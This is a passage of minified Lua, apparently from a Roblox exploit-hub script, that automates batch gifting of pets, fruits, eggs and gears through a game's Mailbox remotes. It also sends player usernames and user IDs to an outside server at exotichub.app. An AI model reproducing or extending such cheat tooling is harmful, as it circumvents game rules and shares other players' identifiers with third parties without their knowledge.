	end;
	MakeId = function(G)
		local V = (((y.HttpService:GenerateGUID(false)):gsub("%-", "")):sub(1, 8)):upper()
		return tostring(G or "EXO") .. ("-" .. V)
	end;
	CleanUsername = function(G)
		G = tostring(G or "")
		return (G:gsub("^%s*@?", "")):gsub("%s+$", "")
	end,
	IsValidUsername = function(G)
		G = Z.Mail.CleanUsername(G)
		if # G < 3 or # G > 20 then
			return false
		end
		return G:match("^[%w_]+$") ~= nil
	end;
	RecipientCacheUrl = "https://exotichub.app/api/gag2-recipient-cache";
	BuildRecipientFromUserIdMail = function(G, V, y)
		G = Z.Mail.CleanUsername(G)
		V = tonumber(V)
		if not V or V <= 0 or not Z.Mail.IsValidUsername(G) then
			return nil, "User was not found"
		end
		if tonumber(V) == tonumber(g.player_userid) then
			return nil, "You cannot send mail to yourself"
		end
		y = tostring(y or "")
		if y == "" then
			y = G
		end
		return {
			userId = V,
			username = G,
			displayName = y
		}
	end;
	LookupRecipientWebCacheMail = function(G)
		G = Z.Mail.CleanUsername(G)
		if not Z.Mail.IsValidUsername(G) then
			return nil, "Enter the exact Roblox username"
		end
		local V = Z.Mail.RecipientCacheUrl .. ("?username=" .. G)
		local j = r.Http.GetRequestFunction()
		local i, c = pcall(function()
			if type(j) == "function" then
				local G = j({
					Url = V,
					Method = "GET";
					Headers = {
						Accept = "application/json"
					}
				})
				if type(G) ~= "table" then
					error("Invalid request response")
				end
				return G.Body or G.body or ""
			end
			return y.HttpService:GetAsync(V, true)
		end)
		if not i or type(c) ~= "string" or c == "" then
			return nil, "Recipient cache unavailable"
		end
		local J, T = pcall(y.HttpService.JSONDecode, y.HttpService, c)
		if not J or type(T) ~= "table" then
			return nil, "Invalid recipient cache response"
		end
		if T.found ~= true then
			return nil, "Recipient cache missed"
		end
		local d = Z.Mail.CleanUsername(T.username or G)
		return Z.Mail.BuildRecipientFromUserIdMail(d, T.userid, d)
	end;
	SaveRecipientWebCacheMail = function(G, V)
		G = Z.Mail.CleanUsername(G)
		V = tonumber(V)
		if not V or V <= 0 or not Z.Mail.IsValidUsername(G) then
			return false
		end
		task.spawn(function()
			pcall(function()
				r.Http.PostJson(Z.Mail.RecipientCacheUrl, {
					username = G,
					userid = V
				})
			end)
		end)
		return true
	end,
	LookupRecipientRobloxMail = function(G)
		G = Z.Mail.CleanUsername(G)
		if not Z.Mail.IsValidUsername(G) then
			return nil, "Enter the exact Roblox username"
		end
		local V, j = pcall(function()
			return y.Players:GetUserIdFromNameAsync(G)
		end)
		if not V or type(j) ~= "number" or j <= 0 then
			return nil, "User was not found"
		end
		return Z.Mail.BuildRecipientFromUserIdMail(G, j, G)
	end,
	LookupRecipientMailboxMail = function(G)
		G = Z.Mail.CleanUsername(G)
		if not Z.Mail.IsValidUsername(G) then
			return nil, "Enter the exact Roblox username"
		end
		local V = y.Networking and (y.Networking.Mailbox and y.Networking.Mailbox.LookupPlayer)
		if not V or type(V.Fire) ~= "function" then
			return nil, "Mailbox lookup is unavailable"
		end
		local j, i, c = pcall(function()
			return V:Fire(G)
		end)
		if not j or type(i) ~= "number" or i <= 0 then
			return nil, "User was not found"
		end
		return Z.Mail.BuildRecipientFromUserIdMail(G, i, c)
	end,
	LookupRecipient = function(G)
		G = Z.Mail.CleanUsername(G)
		if not Z.Mail.IsValidUsername(G) then
			return nil, "Enter the exact Roblox username"
		end
		Z.Mail.SetStatus("Checking @" .. (G .. "..."), "#66CCFF")
		local V, y = Z.Mail.LookupRecipientWebCacheMail(G)
		if V then
			return V
		end
		if y == "You cannot send mail to yourself" then
			return nil, y
		end
		V, y = Z.Mail.LookupRecipientRobloxMail(G)
		if V then
			Z.Mail.SaveRecipientWebCacheMail(V.username, V.userId)
			return V
		end
		if y == "You cannot send mail to yourself" then
			return nil, y
		end
		V, y = Z.Mail.LookupRecipientMailboxMail(G)
		if V then
			Z.Mail.SaveRecipientWebCacheMail(V.username, V.userId)
			return V
		end
		if y == "You cannot send mail to yourself" then
			return nil, y
		end
		return nil, "User was not found"
	end,
	GetInventory = function()
		local G = Z.DataReplica.GetData("Inventory")
		return type(G) == "table" and G or nil
	end;
	IsGiftableCategory = function(G)
		if type(G) ~= "string" or G == "" then
			return false
		end
		if G == "Eggs" then
			return true
		end
		local V = y.MailboxItemCatalog
		if type(V) ~= "table" or type(V.IsGiftable) ~= "function" then
			return false
		end
		local Z, j = pcall(V.IsGiftable, G)
		return Z and j == true
	end,
	IsStackCountMailCategory = function(G)
		return G ~= "Pets" and (G ~= "HarvestedFruits" and Z.Mail.IsGiftableCategory(G))
	end;
	EncodeGearSelection = function(G, V)
		return tostring(G or "") .. ("::" .. tostring(V or ""))
	end,
	DecodeItemSelection = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "")
		if G == "Fruits" then
			return "HarvestedFruits", V
		end
		if G ~= "Gears" then
			return G, V
		end
		local y, j = V:match("^([^:]+)::(.+)$")
		if not Z.Mail.IsGiftableCategory(y) or y == "Seeds" or y == "Pets" or y == "Eggs" or y == "HarvestedFruits" then
			return nil, nil
		end
		return y, j
	end,
	GetGearCategories = function()
		local G = {}
		local V = y.MailboxItemCatalog
		local Z = type(V) == "table" and V.Categories
		if type(Z) ~= "table" then
			return G
		end
		for V, y in ipairs(Z) do
			if type(y) == "string" and (y ~= "Seeds" and (y ~= "Pets" and (y ~= "Eggs" and y ~= "HarvestedFruits"))) then
				table.insert(G, y)
			end
		end
		return G
	end,
	GetBackpackEmptyPotCountsMail = function()
		local G = {}
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if not y or not y:IsA("Tool") then
				continue
			end
			local Z = y:GetAttribute("EmptyPot")
			if type(Z) ~= "string" or Z == "" then
				continue
			end
			local j = math.max(math.floor(tonumber(y:GetAttribute("Count")) or 0), 0)
			if j > 0 then
				G[Z] = ((G[Z] or 0)) + j
			end
		end
		return G
	end;
	GetGearDropdown = function()
		local G = {}
		local V = {}
		local j = Z.Mail.GetInventory() or {}
		local i = Z.Mail.GetBackpackEmptyPotCountsMail()
		local function c(G)
			if type(G) ~= "table" then
				return {}
			end
			if type(G.Data) == "table" then
				return G.Data
			end
			return G
		end
		local function J(G, V)
			G = tostring(G or "")
			V = tostring(V or "")
			if G == "EmptyPots" then
				return math.max(math.floor(tonumber(i[V]) or 0), 0)
			end
			local y = j[G]
			if type(y) ~= "table" then
				return 0
			end
			return math.max(math.floor(tonumber(y[V]) or 0), 0)
		end
		local function T(y, j)
			y = tostring(y or "")
			j = tostring(j or "")
			if y == "" or j == "" then
				return
			end
			if not Z.Mail.IsGiftableCategory(y) then
				return
			end
			if y == "Seeds" or y == "Pets" or y == "Eggs" or y == "HarvestedFruits" then
				return
			end
			local i = Z.Mail.EncodeGearSelection(y, j)
			if V[i] then
				return
			end
			V[i] = true
			local c = J(y, j)
			local T = c > 0 and "#7CFC00" or "#888888"
			local d = y:gsub("(%l)(%u)", "%1 %2")
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">x%d</font> <font color=\"#AAAAAA\">(%s)</font>", j, T, c, d);
				Value = i
			})
		end
		local function d(G, V, y)
			for V, Z in ipairs(c(V)) do
				if type(Z) ~= "table" then
					continue
				end
				for V, y in ipairs(y) do
					local j = Z[y]
					if type(j) == "string" and j ~= "" then
						T(G, j)
						break
					end
				end
			end
		end
		local function u(G)
			if type(G) ~= "table" then
				return nil
			end
			local V = tostring(G.name or G.ItemName or "")
			local y = tostring(G.type or G.ItemType or "")
			local Z = (((y ~= "" and y or V)):lower()):gsub("[^%w]", "")
			local j = (V:lower()):gsub("[^%w]", "")
			if Z == "wateringcan" or j:find("wateringcan", 1, true) then
				return "WateringCans"
			end
			if Z:find("sprinkler", 1, true) or j:find("sprinkler", 1, true) then
				return "Sprinklers"
			end
			if Z == "mushroom" or j:find("mushroom", 1, true) then
				return "Mushrooms"
			end
			if Z == "gnome" then
				return "Gnomes"
			end
			if Z == "raccoon" then
				return "Raccoons"
			end
			if Z == "trowel" then
				return "Trowels"
			end
			if Z == "emptypot" then
				return "EmptyPots"
			end
			if Z == "seedpack" then
				return "SeedPacks"
			end
			if Z == "crate" then
				return "Crates"
			end
			return nil
		end
		d("Sprinklers", y.SprinklerData, {
			"SprinklerName"
		})
		d("WateringCans", y.WateringcanData, {
			"Name"
		})
		d("Mushrooms", y.MushroomData, {
			"Name"
		})
		d("Raccoons", y.RaccoonData, {
			"Name"
		})
		d("Gnomes", y.GnomeData, {
			"Name"
		})
		d("PowerHoses", y.PowerHoseData, {
			"Name"
		})
		d("SeedPacks", y.SeedPackData, {
			"PackName"
		})
		d("Props", y.PropData, {
			"PropName"
		})
		for G, V in ipairs(g.AllCrateShopTable or {}) do
			if type(V) == "table" then
				T("Crates", V.name or V.Name)
			end
		end
		for G, V in ipairs(g.AllGearShopTable or {}) do
			local y = u(V)
			if y then
				T(y, V.name or V.ItemName)
			end
		end
		for G, V in ipairs(Z.Mail.GetGearCategories()) do
			local y = j[V]
			if type(y) ~= "table" then
				continue
			end
			for G in pairs(y) do
				T(V, G)
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Value) < tostring(V.Value)
		end)
		return G
	end;
	GetFruitDropdown = function()
		local G = {}
		local V = {}
		local y = {}
		for G, y in ipairs(Z.Mail.GetBackpackMailFruits and Z.Mail.GetBackpackMailFruits() or {}) do
			local Z = tostring(y.name or "")
			if Z ~= "" then
				V[Z] = ((V[Z] or 0)) + 1
			end
		end
		local function j(Z)
			Z = tostring(Z or "")
			if Z == "" or y[Z] then
				return
			end
			y[Z] = true
			local j = math.max(math.floor(tonumber(V[Z]) or 0), 0)
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#7CFC00\">x%d</font>", Z, j);
				Value = Z
			})
		end
		for G in pairs(V) do
			j(G)
		end
		for G, V in ipairs(g.AllSeedsDataTable or {}) do
			if type(V) == "table" then
				j(V.name)
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Value) < tostring(V.Value)
		end)
		return G
	end;
	GetEggToolCount = function(G)
		local V = 0
		G = tostring(G or "")
		if G == "" then
			return 0
		end
		for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if j and (j:IsA("Tool") and tostring(j:GetAttribute("Egg") or "") == G) then
				local G = 1
				if Z.PackOpenHelpers and type(Z.PackOpenHelpers.GetToolCountPackOpenHelpers) == "function" then
					G = Z.PackOpenHelpers.GetToolCountPackOpenHelpers(j)
				else
					G = j:GetAttribute("Count") or j:GetAttribute("Amount") or j:GetAttribute("Quantity") or 1
				end
				V += math.max(math.floor(tonumber(G) or 1), 1)
			end
		end
		return V
	end,
	GetEggDropdown = function()
		local G = {}
		local V = type(y.EggData) == "table" and y.EggData.Data or {}
		for V, y in ipairs(type(V) == "table" and V or {}) do
			local j = type(y) == "table" and tostring(y.EggName or "") or ""
			if j ~= "" then
				local V = tostring(y.Rarity or "Unknown")
				local i = Z.Data.GetRarityColor(V)
				local c = Z.Mail.GetAvailableCount("Eggs", j)
				table.insert(G, {
					Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#7CFC00\">x%d</font> <font color=\"%s\">%s</font>", j, c, i, V),
					Value = j
				})
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Value) < tostring(V.Value)
		end)
		return G
	end;
	GetItemDisplayName = function(G, V)
		if G == "Pets" then
			local G = y.PetData and y.PetData[V]
			if type(G) == "table" and (type(G.DisplayName) == "string" and G.DisplayName ~= "") then
				return G.DisplayName
			end
		elseif G == "Eggs" and (type(y.EggData) == "table" and type(y.EggData.GetData) == "function") then
			local G, Z = pcall(y.EggData.GetData, V)
			if G and (type(Z) == "table" and (type(Z.EggName) == "string" and Z.EggName ~= "")) then
				return Z.EggName
			end
		end
		return tostring(V or "Unknown")
	end;
	GetOrderItemDisplayName = function(G)
		if type(G) == "table" and (type(G.displayName) == "string" and G.displayName ~= "") then
			return G.displayName
		end
		local V = nil
		local y = nil
		if type(G) == "table" then
			V = G.category
			y = G.itemName
		end
		return Z.Mail.GetItemDisplayName(V, y)
	end,
	CopyStringArrayMail = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in ipairs(G) do
			local Z = tostring(y or "")
			if Z ~= "" then
				table.insert(V, Z)
			end
		end
		return V
	end;
	GetAllowedItemKeysLookup = function(G, V)
		local y = {}
		local Z = false
		local function j(G)
			if type(G) ~= "table" then
				return
			end
			for G, V in ipairs(G) do
				local j = tostring(V or "")
				if j ~= "" then
					y[j] = true
					Z = true
				end
			end
		end
		j(G)
		j(V)
		return y, Z
	end,
	GetItemDropdown = function(G)
		if G == "Seeds" then
			return Z.SeedData.GetSeedDataListDropDown()
		end
		if G == "Gears" then
			return Z.Mail.GetGearDropdown()
		end
		if G == "Eggs" then
			return Z.Mail.GetEggDropdown()
		end
		if G == "Fruits" or G == "HarvestedFruits" then
			return Z.Mail.GetFruitDropdown()
		end
		local V = {}
		if G ~= "Pets" or type(y.PetData) ~= "table" then
			return V
		end
		for G, y in pairs(y.PetData) do
			if type(G) ~= "string" or type(y) ~= "table" then
				continue
			end
			local j = tostring(y.DisplayName or G)
			local i = tostring(y.Rarity or "Unknown")
			local c = Z.Data.GetRarityColor(i)
			table.insert(V, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font>", j, c, i);
				Value = G
			})
		end
		table.sort(V, function(G, V)
			return tostring(G.Value) < tostring(V.Value)
		end)
		return V
	end;
	PassesSelection = function(G, V)
		if type(G) ~= "table" or next(G) == nil then
			return true
		end
		return G[V] == true
	end;
	CopySelection = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			V[G] = y
		end
		return V
	end,
	SelectionKey = function(G)
		local V = {}
		if type(G) ~= "table" then
			return ""
		end
		for G, y in pairs(G) do
			if y == true then
				table.insert(V, tostring(G))
			elseif type(G) == "number" and tostring(y or "") ~= "" then
				table.insert(V, tostring(y))
			elseif type(G) == "string" and (y ~= nil and y ~= false) then
				table.insert(V, tostring(G))
			end
		end
		table.sort(V)
		return table.concat(V, ",")
	end;
	NormaliseFruitFilters = function(G, V, y, j, i, c)
		G = math.max(tonumber(G) or 0, 0)
		V = tonumber(V) or 89
		if V < G then
			return nil, nil, "Max KG must be equal to or above Min KG"
		end
		return G, V, nil, Z.Mail.CopySelection(y), Z.Mail.CopySelection(j), Z.Mail.CopySelection(i), Z.Mail.CopySelection(c)
	end;
	GetFruitFilterKey = function(G, V, y, j)
		return table.concat({
			tostring(tonumber(G) or 0),
			tostring(tonumber(V) or 89),
			Z.Mail.SelectionKey(y);
			Z.Mail.SelectionKey(j)
		}, "|")
	end,
	GetFruitFilterText = function(G)
		if type(G) ~= "table" or G.category ~= "HarvestedFruits" then
			return ""
		end
		local V = {
			string.format("KG %.2f-%.2f", tonumber(G.fruitMinKg) or 0, tonumber(G.fruitMaxKg) or 89)
		}
		if not Z.FruitFilters.IsSelectionEmpty(G.fruitMutations) then
			table.insert(V, "Mutations")
		end
		if not Z.FruitFilters.IsSelectionEmpty(G.fruitVariants) then
			table.insert(V, "Variants")
		end
		return " <font color=\'#AAAAAA\'>[" .. (table.concat(V, ", ") .. "]</font>")
	end;
	GetPetVariant = function(G)
		if type(G) == "table" and G.Type == "Rainbow" then
			return "Rainbow"
		end
		return "Normal"
	end,
	GetPetSize = function(G)
		local V = type(G) == "table" and G.Size
		if V == "Big" or V == "Huge" then
			return V
		end
		return "Normal"
	end,
	CleanupRecentlySentPets = function()
		local G = os.clock()
		for V, y in pairs(Z.Mail.RecentlySentPets) do
			if tonumber(y) == nil or G >= y then
				Z.Mail.RecentlySentPets[V] = nil
			end
		end
	end;
	GetMatchingPets = function(G, V, y, j)
		local i = {}
		local c = Z.Mail.GetInventory()
		local J = c and c.Pets
		if type(J) ~= "table" then
			return i
		end
		Z.Mail.CleanupRecentlySentPets()
		for c, J in pairs(J) do
			if type(J) ~= "table" or J.Id == nil then
				continue
			end
			local T = J.Name or J.PetName or J.Species
			local d = tostring(c)
			local u = tostring(J.Id)
			if T ~= G or J.Equipped == true or Z.Mail.EquippedPets[d] or Z.Mail.EquippedPets[u] or Z.Mail.RecentlySentPets[d] or Z.Mail.RecentlySentPets[u] or type(j) == "table" and ((j[d] or j[u])) then
				continue
			end
			local q = Z.Mail.GetPetVariant(J)
			local g = Z.Mail.GetPetSize(J)
			if not Z.Mail.PassesSelection(V, q) or not Z.Mail.PassesSelection(y, g) then
				continue
			end
			table.insert(i, {
				key = d,
				id = u;
				data = J
			})
		end
		table.sort(i, function(G, V)
			return G.key < V.key
		end)
		return i
	end;
	GetMatchingPetsByKeys = function(G, V, y, j)
		local i = {}
		local c, J = Z.Mail.GetAllowedItemKeysLookup(V, y)
		if not J then
			return i
		end
		local T = Z.Mail.GetInventory()
		local d = T and T.Pets
		if type(d) ~= "table" then
			return i
		end
		Z.Mail.CleanupRecentlySentPets()
		for V, y in pairs(d) do
			if type(y) ~= "table" or y.Id == nil then
				continue
			end
			local J = y.Name or y.PetName or y.Species
			local T = tostring(V)
			local d = tostring(y.Id)
			if J ~= G or not ((c[T] or c[d])) then
				continue
			end
			if y.Equipped == true or Z.Mail.EquippedPets[T] or Z.Mail.EquippedPets[d] then
				continue
			end
			if Z.Mail.RecentlySentPets[T] or Z.Mail.RecentlySentPets[d] then
				continue
			end
			if type(j) == "table" and ((j[T] or j[d])) then
				continue
			end
			table.insert(i, {
				key = T,
				id = d;
				data = y
			})
		end
		table.sort(i, function(G, V)
			return G.key < V.key
		end)
		return i
	end,
	CleanupRecentlySentFruits = function()
		local G = os.clock()
		for V, y in pairs(Z.Mail.RecentlySentFruits) do
			if tonumber(y) == nil or G >= y then
				Z.Mail.RecentlySentFruits[V] = nil
			end
		end
	end;
	GetBackpackMailFruits = function()
		local G = {}
		local V = {}
		if Z.GiftSystem and type(Z.GiftSystem.GetBackpackFruitsGiftSystem) == "function" then
			local G, y = pcall(Z.GiftSystem.GetBackpackFruitsGiftSystem)
			V = G and (type(y) == "table" and y) or {}
		elseif Z.SellManager and type(Z.SellManager.GetBackpackFruitsForSelling) == "function" then
			local G, y = pcall(Z.SellManager.GetBackpackFruitsForSelling)
			V = G and (type(y) == "table" and y) or {}
		end
		for V, y in ipairs(V) do
			if type(y) ~= "table" then
				continue
			end
			local Z = tostring(y.key or y.id or "")
			local j = tostring(y.name or y.n or "")
			if Z == "" or j == "" then
				continue
			end
			table.insert(G, {
				key = Z;
				id = tostring(y.id or Z),
				name = j;
				weight = tonumber(y.w) or 0;
				data = y
			})
		end
		table.sort(G, function(G, V)
			if ((tonumber(G.weight) or 0)) ~= ((tonumber(V.weight) or 0)) then
				return ((tonumber(G.weight) or 0)) < ((tonumber(V.weight) or 0))
			end
			return tostring(G.key) < tostring(V.key)
		end)
		return G
	end;
	GetMatchingFruits = function(G, V, y, j, i, c, J, T)
		local d = {}
		G = tostring(G or "")
		V = math.max(tonumber(V) or 0, 0)
		y = tonumber(y) or 89
		if G == "" then
			return d
		end
		Z.Mail.CleanupRecentlySentFruits()
		for u, q in ipairs(Z.Mail.GetBackpackMailFruits()) do
			if q.name ~= G then
				continue
			end
			if type(c) == "table" and ((c[q.key] or c[q.id])) then
				continue
			end
			if Z.Mail.RecentlySentFruits[q.key] or Z.Mail.RecentlySentFruits[q.id] then
				continue
			end
			local g = q.data
			if type(g) ~= "table" or g.has_weight == false or q.weight <= 0 then
				continue
			end
			if not Z.FruitFilters.PassesWeightRange(q.weight, V, y) then
				continue
			end
			local E, a = Z.FruitFilters.GetMutationLookup(g)
			if not Z.FruitFilters.PassesMutationSelection(a, j, J) then
				continue
			end
			local H = Z.FruitFilters.GetFruitVariant(g, a)
			if not Z.FruitFilters.PassesVariantSelection(H, i, T) then
				continue
			end
			table.insert(d, q)
		end
		return d
	end,
	GetMatchingFruitsByKeys = function(G, V, y, j)
		local i = {}
		local c, J = Z.Mail.GetAllowedItemKeysLookup(V, y)
		if not J then
			return i
		end
		G = tostring(G or "")
		if G == "" then
			return i
		end
		Z.Mail.CleanupRecentlySentFruits()
		for V, y in ipairs(Z.Mail.GetBackpackMailFruits()) do
			if y.name ~= G then
				continue
			end
			if not ((c[y.key] or c[y.id])) then
				continue
			end
			if Z.Mail.RecentlySentFruits[y.key] or Z.Mail.RecentlySentFruits[y.id] then
				continue
			end
			if type(j) == "table" and ((j[y.key] or j[y.id])) then
				continue
			end
			table.insert(i, y)
		end
		return i
	end;
	GetAvailableCount = function(G, V, y, j, i, c, J, T, d, u, q, g, E)
		local a = Z.Mail.GetInventory()
		if G == "Eggs" then
			local G = type(a) == "table" and a.Eggs or nil
			local y = type(G) == "table" and math.max(math.floor(tonumber(G[V]) or 0), 0) or 0
			return math.max(y, Z.Mail.GetEggToolCount(V))
		end
		if G == "EmptyPots" then
			local G = Z.Mail.GetBackpackEmptyPotCountsMail()
			return math.max(math.floor(tonumber(G[V]) or 0), 0)
		end
		if not a then
			return 0
		end
		local H, r = Z.Mail.GetAllowedItemKeysLookup(g, E)
		if G == "Pets" and r then
			return # Z.Mail.GetMatchingPetsByKeys(V, g, E, i)
		end
		if G == "HarvestedFruits" and r then
			return # Z.Mail.GetMatchingFruitsByKeys(V, g, E, i)
		end
		if G == "Pets" then
			return # Z.Mail.GetMatchingPets(V, y, j, i)
		end
		if G == "HarvestedFruits" then
			return # Z.Mail.GetMatchingFruits(V, c, J, T, d, i, u, q)
		end
		if not Z.Mail.IsGiftableCategory(G) then
			return 0
		end
		local Y = a[G]
		return type(Y) == "table" and math.max(math.floor(tonumber(Y[V]) or 0), 0) or 0
	end;
	GetBatchAmount = function(G, V)
		V = math.max(math.floor(tonumber(V) or 0), 0)
		if Z.Mail.IsStackCountMailCategory(G) then
			return math.min(V, Z.Mail.MaxStackMailCount)
		end
		return math.min(V, Z.Mail.MaxBatchItems)
	end,
	BuildBatch = function(G, V, y, j, i, c, J, T, d, u, q, g, E, a)
		local H = {}
		y = Z.Mail.GetBatchAmount(G, y)
		if y <= 0 then
			return H, 0
		end
		if G == "Pets" then
			local G, J = Z.Mail.GetAllowedItemKeysLookup(E, a)
			local T
			if J then
				T = Z.Mail.GetMatchingPetsByKeys(V, E, a, c)
			else
				T = Z.Mail.GetMatchingPets(V, j, i, c)
			end
			local d = math.min(y, # T)
			for G = 1, d, 1 do
				table.insert(H, {
					Category = "Pets",
					ItemKey = T[G].key;
					Count = 1
				})
			end
			return H, d
		end
		if G == "HarvestedFruits" then
			local G, j = Z.Mail.GetAllowedItemKeysLookup(E, a)
			local i
			if j then
				i = Z.Mail.GetMatchingFruitsByKeys(V, E, a, c)
			else
				i = Z.Mail.GetMatchingFruits(V, J, T, d, u, c, q, g)
			end
			local r = math.min(y, # i)
			for G = 1, r, 1 do
				table.insert(H, {
					Category = "HarvestedFruits",
					ItemKey = i[G].key;
					Count = 1
				})
			end
			return H, r
		end
		if not Z.Mail.IsGiftableCategory(G) then
			return H, 0
		end
		local r = Z.Mail.GetAvailableCount(G, V)
		local Y = math.min(y, r, Z.Mail.MaxStackMailCount)
		if Y > 0 then
			table.insert(H, {
				Category = G,
				ItemKey = V;
				Count = Y
			})
		end
		return H, Y
	end;
	MarkBatchSent = function(G)
		for G, V in ipairs(G or {}) do
			if V.Category == "Pets" and type(V.ItemKey) == "string" then
				Z.Mail.RecentlySentPets[V.ItemKey] = os.clock() + 30
			elseif V.Category == "HarvestedFruits" and type(V.ItemKey) == "string" then
				Z.Mail.RecentlySentFruits[V.ItemKey] = os.clock() + 30
			end
		end
	end;
	SendBatch = function(G, V, j, i, c)
		if Z.Mail.Busy then
			return false, "Mailbox is busy"
		end
		if type(G) ~= "table" or type(G.userId) ~= "number" or type(V) ~= "table" or # V == 0 then
			return false, "Invalid mail request"
		end
		if # V > Z.Mail.MaxBatchItems then
			return false, "Too many mail attachments"
		end
		local J = y.Networking and (y.Networking.Mailbox and y.Networking.Mailbox.SendBatch)
		if not J or type(J.Fire) ~= "function" then
			return false, "Mailbox sending is unavailable"
		end
		Z.Mail.Busy = true
		local T = Z.Mail.GetSendWait()
		while T > 0 do
			if type(i) == "function" and not i() then
				Z.Mail.Busy = false
				return false, "Manual order stopped"
			end
			if g.MailManualRunning then
				Z.Mail.SetManualUiStatus(string.format("Waiting %ds before the next mail", math.ceil(T)), "#FFCC66", "\226\143\179")
			end
			task.wait(math.min(T, 1))
			T = Z.Mail.GetSendWait()
		end
		if type(i) == "function" and not i() then
			Z.Mail.Busy = false
			return false, "Manual order stopped"
		end
		j = Z.Mail.GetNote(j)
		local d, u, q = pcall(function()
			return J:Fire(G.userId, V, j)
		end)
		Z.Mail.Busy = false
		if not d then
			return false, "Try again"
		end
		if u ~= true then
			return false, type(q) == "string" and (q ~= "" and q) or "Could not send gift"
		end
		local E = Z.Mail.GetNextSendDelay(c == true)
		Z.Mail.NextSendAt = os.clock() + E
		h.mail_next_send_at = Z.Mail.GetServerTime() + E
		Z.Mail.MarkBatchSent(V)
		a.Save.SaveDataSync()
		return true, type(q) == "string" and (q ~= "" and q) or "Gift sent!"
	end,
	WaitForInventoryChange = function(G, V, y, j, i, c, J, T, d, u, q, g, E)
		local a = os.clock() + 2.5
		repeat
			task.wait(.1)
			local H = Z.Mail.GetAvailableCount(G, V, j, i, nil, c, J, T, d, u, q, g, E)
			if H < y then
				return true
			end
		until os.clock() >= a
		return false
	end,
	GetDraftItemsForUi = function()
		local G = g.MailActiveOrder
		if type(G) ~= "table" then
			G = h.mail_manual_order
		end
		if type(G) == "table" and (type(G.items) == "table" and # G.items > 0) then
			return G.items, true
		end
		return g.MailDraftItems, false
	end;
	GetDraftText = function()
		local G, V = Z.Mail.GetDraftItemsForUi()
		if type(G) ~= "table" or # G == 0 then
			return "<font color=\'#888888\'>No items added</font>"
		end
		local y = {}
		for G, j in ipairs(G) do
			local i = math.max(math.floor(tonumber(j.amount) or 0), 0)
			local c = math.clamp(math.floor(tonumber(j.sent) or 0), 0, i)
			local J = Z.Mail.GetOrderItemDisplayName(j) .. Z.Mail.GetFruitFilterText(j)
			if V then
				table.insert(y, string.format("%d. %s <font color=\'#7CFC00\'>%d/%d</font> <font color=\'#AAAAAA\'>(%s)</font>", G, J, c, i, tostring(j.category or "Unknown")))
			else
				table.insert(y, string.format("%d. %dx %s <font color=\'#AAAAAA\'>(%s)</font>", G, i, J, tostring(j.category or "Unknown")))
			end
		end
		return table.concat(y, "\n")
	end,
	RefreshDraftUi = function()
		local G = g.MailUiRefs
		local V = type(G) == "table" and G.RefreshDraft or nil
		if type(V) ~= "function" then
			return
		end
		pcall(V)
	end,
	AddDraftItem = function(G, V, y, j, i, c, J, T, d)
		if g.MailManualRunning then
			return false, "Stop the current order first"
		end
		G, V = Z.Mail.DecodeItemSelection(G, V)
		if not Z.Mail.IsGiftableCategory(G) then
			return false, "Select an item category"
		end
		if type(V) ~= "string" or V == "" then
			return false, "Select an item"
		end
		y = math.floor(tonumber(y) or 0)
		if y <= 0 then
			return false, "Amount must be above 0"
		end
		local u = ""
		local q, E, a, H, r, Y, e
		if G == "HarvestedFruits" then
			q, E, a, H, r, Y, e = Z.Mail.NormaliseFruitFilters(j, i, c, J, T, d)
			if a then
				return false, a
			end
			u = Z.Mail.GetFruitFilterKey(q, E, H, r)
		end
		for j, i in ipairs(g.MailDraftItems) do
			if i.category == G and (i.itemName == V and tostring(i.filterKey or "") == u) then
				i.amount += y
				Z.Mail.RefreshDraftUi()
				return true, "Order item updated"
			end
		end
		local s = {
			category = G,
			itemName = V;
			amount = y
		}
		if G == "HarvestedFruits" then
			s.fruitMinKg = q
			s.fruitMaxKg = E
			s.fruitMutations = H
			s.fruitVariants = r
			s.fruitMutationBlacklist = Y
			s.fruitVariantBlacklist = e
			s.filterKey = u
		end
		table.insert(g.MailDraftItems, s)
		Z.Mail.RefreshDraftUi()
		return true, "Item added"
	end;
	ClearDraft = function()
		if g.MailManualRunning then
			return false
		end
		table.clear(g.MailDraftItems)
		Z.Mail.RefreshDraftUi()
		return true
	end,
	CloneDraftItems = function()
		local G = {}
		for V, y in ipairs(g.MailDraftItems) do
			table.insert(G, {
				category = y.category;
				itemName = y.itemName,
				amount = y.amount,
				sent = 0,
				fruitMinKg = y.fruitMinKg,
				fruitMaxKg = y.fruitMaxKg;
				fruitMutations = Z.Mail.CopySelection(y.fruitMutations),
				fruitVariants = Z.Mail.CopySelection(y.fruitVariants),
				fruitMutationBlacklist = Z.Mail.CopySelection(y.fruitMutationBlacklist),
				fruitVariantBlacklist = Z.Mail.CopySelection(y.fruitVariantBlacklist);
				filterKey = y.filterKey
			})
		end
		return G
	end,
	BuildReceipt = function(G)
		local V = {
			"MAIL RECEIPT " .. tostring(G.id);
			"Delivered: " .. os.date("%d/%m/%Y %H:%M:%S");
			string.format("To: @%s (%s)", tostring(G.recipient.username), tostring(G.recipient.userId));
			"Items:"
		}
		for G, y in ipairs(G.items) do
			table.insert(V, string.format("- %dx %s (%s)", y.amount, Z.Mail.GetOrderItemDisplayName(y) .. Z.Mail.GetFruitFilterText(y), y.category))
		end
		table.insert(V, "Status: Delivered")
		return table.concat(V, "\n")
	end;
	TrimReceipts = function()
		if type(h.mail_receipts) ~= "table" then
			h.mail_receipts = {}
		end
		for G = # h.mail_receipts, 1, - 1 do
			if type(h.mail_receipts[G]) ~= "string" then
				table.remove(h.mail_receipts, G)
			end
		end
		while # h.mail_receipts > Z.Mail.MaxReceipts do
			table.remove(h.mail_receipts)
		end
	end;
	AddReceipt = function(G)
		if type(G) ~= "string" or G == "" then
			return false
		end
		Z.Mail.TrimReceipts()
		table.insert(h.mail_receipts, 1, G)
		Z.Mail.TrimReceipts()
		a.Save.SaveDataSync()
